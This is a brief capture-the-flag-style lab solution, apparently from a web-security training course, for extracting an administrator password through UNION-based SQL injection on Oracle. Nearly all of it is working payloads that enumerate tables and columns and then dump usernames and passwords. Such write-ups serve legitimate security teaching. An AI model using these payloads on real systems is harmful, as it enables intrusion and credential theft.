# Lab: SQL injection attack, listing the database contents on Oracle (Practitioner)

**Goal:** Retrieve the administrator password.

## Solution Steps

1. List tables:

```
' UNION SELECT table_name, NULL FROM all_tables--
```

2. List columns:

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXXX'--
```

Note: Oracle stores identifiers in UPPERCASE by default.

3. Retrieve data:

```
' UNION SELECT USERNAME_XXXXX, PASSWORD_XXXXX FROM USERS_XXXXX--
```

## Key Payloads

```
' UNION SELECT table_name, NULL FROM all_tables--
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXXX'--
' UNION SELECT USERNAME_XXXXX, PASSWORD_XXXXX FROM USERS_XXXXX--
```
